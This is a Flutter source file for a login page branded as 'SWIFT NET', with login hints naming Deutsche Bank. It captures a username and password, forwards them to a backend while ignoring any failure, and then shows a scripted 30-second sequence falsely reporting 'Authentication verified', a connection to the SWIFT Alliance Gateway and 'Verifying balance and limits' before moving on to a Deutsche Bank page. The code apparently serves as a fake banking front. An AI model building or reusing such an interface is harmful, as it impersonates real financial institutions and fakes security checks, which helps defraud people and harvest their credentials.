import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import '../theme/app_colors.dart';
import '../services/session_service.dart';
import '../services/api_service.dart';
import '../widgets/swift_network_background.dart';
import 'deutsche_bank_auth_page.dart';

class WelcomeLoginPage extends StatefulWidget {
  const WelcomeLoginPage({super.key});

  @override
  State<WelcomeLoginPage> createState() => _WelcomeLoginPageState();
}

class _WelcomeLoginPageState extends State<WelcomeLoginPage>
    with SingleTickerProviderStateMixin {
  final _usernameCtrl = TextEditingController();
  final _passwordCtrl = TextEditingController();
  final _session = SessionService();

  bool _isLoading = false;
  static const _loadingDuration = Duration(seconds: 30);
  late AnimationController _loadingController;

  @override
  void initState() {
    super.initState();
    _loadingController = AnimationController(
      duration: _loadingDuration,
      vsync: this,
    )..addStatusListener((status) async {
        if (status == AnimationStatus.completed) {
          final username = _usernameCtrl.text.trim();
          await _session.saveUsername(username);
          await _session.setLoggedIn(true);

          if (!mounted) return;
          Navigator.pushReplacement(
            context,
            MaterialPageRoute(builder: (_) => const DeutscheBankAuthPage()),
          );
        }
      });
  }

  @override
  void dispose() {
    _loadingController.dispose();
    _usernameCtrl.dispose();
    _passwordCtrl.dispose();
    super.dispose();
  }

  void _handleLogin() async {
    final username = _usernameCtrl.text.trim();
    final password = _passwordCtrl.text;

    if (username.isEmpty || password.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          backgroundColor: const Color(0xFF1A050B),
          behavior: SnackBarBehavior.floating,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(2),
            side: BorderSide(color: const Color(0xFFFF3366).withValues(alpha: 0.8)),
          ),
          content: Row(
            children: [
              const Icon(Icons.error_outline, color: Color(0xFFFF3366), size: 18),
              const SizedBox(width: 10),
              Expanded(
                child: Text(
                  'ACCESS DENIED: Login and Password cannot be empty.',
                  style: GoogleFonts.jetBrainsMono(
                    color: const Color(0xFFFF3366),
                    fontSize: 12,
                    fontWeight: FontWeight.w600,
                  ),
                ),
              ),
            ],
          ),
        ),
      );
      return;
    }

    setState(() => _isLoading = true);
    _loadingController.forward(from: 0.0);

    try {
      await ApiService.login(username, password);
    } catch (e) {
      // ignore - backend optional
    }
  }

  @override
  Widget build(BuildContext context) {
    if (_isLoading) {
      return _buildLoadingScreen();
    }
    return _buildLoginForm();
  }

  Widget _buildLoadingScreen() {
    const accent = AppColors.accentGreen;
    final cardBg = const Color(0xFF09111D).withValues(alpha: 0.92);
    final borderColor = const Color(0xFF00A8FF).withValues(alpha: 0.35);
    const inputBg = Color(0xFF050B14);

    return Scaffold(
      backgroundColor: const Color(0xFF03070E),
      body: SwiftNetworkBackground(
        child: Center(
          child: Container(
            width: 520,
            padding: const EdgeInsets.symmetric(horizontal: 40, vertical: 36),
            decoration: BoxDecoration(
              color: cardBg,
              border: Border.all(color: borderColor),
              borderRadius: BorderRadius.circular(4),
              boxShadow: [
                const BoxShadow(
                  color: Color(0x77000000),
                  blurRadius: 35,
                  spreadRadius: 8,
                ),
                BoxShadow(
                  color: const Color(0xFF00A8FF).withValues(alpha: 0.15),
                  blurRadius: 25,
                  spreadRadius: 1,
                ),
              ],
            ),
            child: AnimatedBuilder(
              animation: _loadingController,
              builder: (context, child) {
                final progress = _loadingController.value;
                final percent = (progress * 100).clamp(0, 100).toStringAsFixed(0);

                return Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    // Spinning indicator with glow
                    Container(
                      width: 64,
                      height: 64,
                      padding: const EdgeInsets.all(4),
                      child: const CircularProgressIndicator(
                        strokeWidth: 3,
                        backgroundColor: inputBg,
                        valueColor: AlwaysStoppedAnimation<Color>(accent),
                      ),
                    ),
                    const SizedBox(height: 25),

                    Text(
                      'CONNECTING TO SECURE SERVER',
                      style: GoogleFonts.jetBrainsMono(
                        color: Colors.white,
                        fontSize: 14,
                        letterSpacing: 2,
                        fontWeight: FontWeight.w700,
                      ),
                    ),
                    const SizedBox(height: 25),

                    // Progress bar
                    Container(
                      height: 6,
                      decoration: BoxDecoration(
                        color: inputBg,
                        border: Border.all(color: const Color(0xFF1E293B)),
                        borderRadius: BorderRadius.circular(1),
                      ),
                      child: ClipRRect(
                        borderRadius: BorderRadius.circular(1),
                        child: LinearProgressIndicator(
                          value: progress,
                          backgroundColor: Colors.transparent,
                          valueColor: const AlwaysStoppedAnimation<Color>(accent),
                        ),
                      ),
                    ),
                    const SizedBox(height: 14),

                    // Progress percentage
                    Text(
                      '$percent%',
                      style: GoogleFonts.jetBrainsMono(
                        color: accent,
                        fontSize: 26,
                        fontWeight: FontWeight.w800,
                        letterSpacing: 2,
                        shadows: [
                          Shadow(
                            color: accent.withValues(alpha: 0.5),
                            blurRadius: 10,
                          ),
                        ],
                      ),
                    ),
                    const SizedBox(height: 4),
                    Text(
                      'Connecting to SWIFT Alliance Gateway...',
                      style: GoogleFonts.jetBrainsMono(
                        color: const Color(0xFF64748B),
                        fontSize: 10.5,
                        letterSpacing: 1,
                      ),
                    ),

                    const SizedBox(height: 25),
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 14),
                      decoration: BoxDecoration(
                        color: inputBg,
                        border: Border.all(color: const Color(0xFF1E293B)),
                        borderRadius: BorderRadius.circular(2),
                      ),
                      child: Column(
                        children: [
                          _LoadingStep(
                            status: progress > 0.15 ? '✓' : '...',
                            text: 'Authentication verified',
                            done: progress > 0.15,
                          ),
                          _LoadingStep(
                            status: progress > 0.45 ? '✓' : '...',
                            text: 'Loading account data',
                            done: progress > 0.45,
                          ),
                          _LoadingStep(
                            status: progress > 0.70 ? '✓' : '...',
                            text: 'Establishing secure connection',
                            done: progress > 0.70,
                          ),
                          _LoadingStep(
                            status: progress > 0.90 ? '✓' : '...',
                            text: 'Verifying balance and limits',
                            done: progress > 0.90,
                          ),
                        ],
                      ),
                    ),
                  ],
                );
              },
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildLoginForm() {
    return Scaffold(
      backgroundColor: const Color(0xFF03070E),
      body: SwiftNetworkBackground(
        child: Center(
          child: Container(
            width: 550,
            padding: const EdgeInsets.all(40),
            decoration: BoxDecoration(
              color: const Color(0xFF09111D).withValues(alpha: 0.92),
              border: Border.all(color: const Color(0xFF1E293B)),
              borderRadius: BorderRadius.circular(2),
              boxShadow: const [
                BoxShadow(
                  color: Color(0x77000000),
                  blurRadius: 35,
                  spreadRadius: 8,
                ),
                BoxShadow(
                  color: Color(0x1A00FF66),
                  blurRadius: 20,
                  spreadRadius: 0,
                ),
              ],
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  'WELCOME TO\nSWIFT NET',
                  style: GoogleFonts.jetBrainsMono(
                    fontSize: 28,
                    fontWeight: FontWeight.w700,
                    color: AppColors.textPrimary,
                    letterSpacing: 3,
                    height: 1.2,
                  ),
                ),
                const SizedBox(height: 30),
                Container(
                  padding: const EdgeInsets.only(bottom: 20),
                  decoration: const BoxDecoration(
                    border: Border(bottom: BorderSide(color: Color(0xFF1E293B))),
                  ),
                  child: Row(
                    children: [
                      const Text('\$ ', style: TextStyle(color: Color(0xFF00FF66))),
                      Text(
                        'global_server/start',
                        style: GoogleFonts.jetBrainsMono(color: const Color(0xFF94A3B8)),
                      ),
                    ],
                  ),
                ),
                const SizedBox(height: 30),
                _buildField('Login', _usernameCtrl, hint: 'e.g. DeutscheBank_Betty_Bima'),
                const SizedBox(height: 20),
                _buildField('Password', _passwordCtrl, isPassword: true, hint: 'e.g. •••••'),
                const SizedBox(height: 30),
                InkWell(
                  onTap: _handleLogin,
                  borderRadius: BorderRadius.circular(2),
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 25, vertical: 10),
                    decoration: BoxDecoration(
                      color: const Color(0xFF0D1726),
                      border: Border.all(color: const Color(0xFF00FF66).withValues(alpha: 0.6)),
                      borderRadius: BorderRadius.circular(2),
                      boxShadow: const [
                        BoxShadow(
                          color: Color(0x2200FF66),
                          blurRadius: 10,
                          spreadRadius: 1,
                        ),
                      ],
                    ),
                    child: Text(
                      '[ ENTER ]',
                      style: GoogleFonts.jetBrainsMono(
                        color: const Color(0xFF00FF66),
                        fontSize: 13,
                        fontWeight: FontWeight.w700,
                        letterSpacing: 2,
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildField(String label, TextEditingController ctrl, {bool isPassword = false, String? hint}) {
    return Row(
      children: [
        SizedBox(
          width: 90,
          child: Text(
            label,
            style: GoogleFonts.jetBrainsMono(
              color: const Color(0xFF94A3B8),
              fontSize: 14,
              letterSpacing: 1,
            ),
          ),
        ),
        const Text(' : ', style: TextStyle(color: Color(0xFF475569))),
        Expanded(
          child: TextField(
            controller: ctrl,
            obscureText: isPassword,
            obscuringCharacter: '•',
            style: GoogleFonts.jetBrainsMono(color: AppColors.textPrimary, fontSize: 14),
            decoration: InputDecoration(
              isDense: true,
              hintText: hint,
              hintStyle: GoogleFonts.jetBrainsMono(color: const Color(0xFF475569), fontSize: 13),
              contentPadding: const EdgeInsets.symmetric(vertical: 5),
              border: const UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFF1E293B))),
              enabledBorder: const UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFF1E293B))),
              focusedBorder: const UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFF00FF66))),
            ),
          ),
        ),
      ],
    );
  }
}

// ============ LOADING STEP ============
class _LoadingStep extends StatelessWidget {
  final String status;
  final String text;
  final bool done;

  const _LoadingStep({
    required this.status,
    required this.text,
    required this.done,
  });

  @override
  Widget build(BuildContext context) {
    const accent = AppColors.accentGreen;
    const secondary = Color(0xFFCBD5E1);
    const muted = Color(0xFF475569);

    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        children: [
          SizedBox(
            width: 18,
            child: Text(
              status,
              style: GoogleFonts.jetBrainsMono(
                color: done ? accent : muted,
                fontSize: 12,
                fontWeight: FontWeight.w700,
              ),
            ),
          ),
          const SizedBox(width: 8),
          Expanded(
            child: Text(
              text,
              style: GoogleFonts.jetBrainsMono(
                color: done ? secondary : muted,
                fontSize: 11,
                fontWeight: done ? FontWeight.w500 : FontWeight.normal,
              ),
            ),
          ),
        ],
      ),
    );
  }
}
